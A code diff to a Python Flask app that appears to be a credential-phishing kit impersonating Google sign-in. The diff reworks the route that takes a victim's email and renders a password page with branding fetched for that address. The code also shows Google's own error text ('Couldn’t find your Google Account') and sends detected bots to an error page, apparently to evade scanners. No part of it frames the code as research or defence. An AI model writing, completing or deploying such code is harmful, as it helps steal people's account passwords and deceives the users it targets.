@@ -285,35 +285,32 @@ def index():
     return render_template('index.html')
 
 # New route to handle email submission from index.html and redirect to password page
-@app.route('/submit-email', methods=['GET', 'POST'])
-def submit_email():
-    if request.method == 'GET':
-        email = session.get('email')
-        if email:
-            branding = get_google_email_details(email)
-            print(f"[DEBUG] GET /submit-email: rendering password.html for {email}")
-            return render_template('password.html', email=email, branding=branding)
-        print("[DEBUG] GET /submit-email: no email in session, redirecting to index.html")
-        return redirect(url_for('index'))
-    # POST logic
-    email = request.form.get('email')
-    error = None
-    branding = None
-    print(f"[DEBUG] submit_email called with: {email}")
-    if not email:
-        print("[DEBUG] No email provided.")
-        return render_template('index.html', error="Enter an email or phone number.")
-    if not is_valid_email(email):
-        print(f"[DEBUG] Invalid email: {email}")
-        error = "Couldn’t find your Google Account"
-        return render_template('index.html', error=error)
+@app.route('/password', methods=['GET', 'POST'])
+def password():
     if is_bot_request():
-        print(f"[DEBUG] Bot detected for email: {email}")
         return redirect(url_for('bot_error_handler'))
-    session['email'] = email
-    branding = get_google_email_details(email)
-    print(f"[DEBUG] Redirecting to GET /submit-email for: {email}")
-    return redirect(url_for('submit_email'))
+
+    email = request.args.get('email') or request.form.get('email') or session.get('email')
+    if not email:
+        return redirect(url_for('index'))
+    
+    try:
+        # Fetch branding details here, only when the password page is loaded.
+        branding = get_google_email_details(email)
+        session['banner'] = branding.get('banner')
+        session['background'] = branding.get('background')
+        session['email'] = email
+
+        return render_template(
+            'password.html',
+            email=email,
+            banner=session.get('banner'),
+            background=session.get('background'),
+            error=request.args.get('error'),
+        )
+    except Exception as e:
+        print(f"Error in password route: {str(e)}")
+        return redirect(url_for('index'))
 
 @app.route('/enter-password', methods=['GET', 'POST'])
 def enter_password():
